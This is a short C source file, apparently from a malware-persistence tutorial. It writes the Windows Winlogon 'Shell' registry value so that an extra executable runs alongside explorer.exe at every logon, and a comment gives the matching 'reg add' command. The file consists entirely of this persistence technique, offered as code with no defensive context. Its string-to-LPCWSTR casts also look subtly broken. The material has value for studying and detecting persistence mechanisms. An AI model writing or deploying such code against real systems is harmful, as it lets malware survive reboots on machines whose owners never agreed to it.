#include <windows.h>
#include <string.h>

int main(int argc, char* argv[]) {
    HKEY hkey = NULL;

    // shell
    // const char* sh = "explorer.exe,Z:\\2022-06-12-malware-pers-7\\hack.exe";
    const char* sh = "explorer.exe,hello.exe";

    // startup
    LONG res = RegOpenKeyEx(HKEY_LOCAL_MACHINE, (LPCWSTR)"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon", 0, KEY_WRITE, &hkey);
    if (res == ERROR_SUCCESS) {
        // create new registry key

        // reg add "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\CurrentVersion\Winlogon" /v "Shell" /t REG_SZ /d "explorer.exe,..." /f
        RegSetValueEx(hkey, (LPCWSTR)"Shell", 0, REG_SZ, (unsigned char*)sh, strlen(sh));
        RegCloseKey(hkey);
    }

    return 0;
}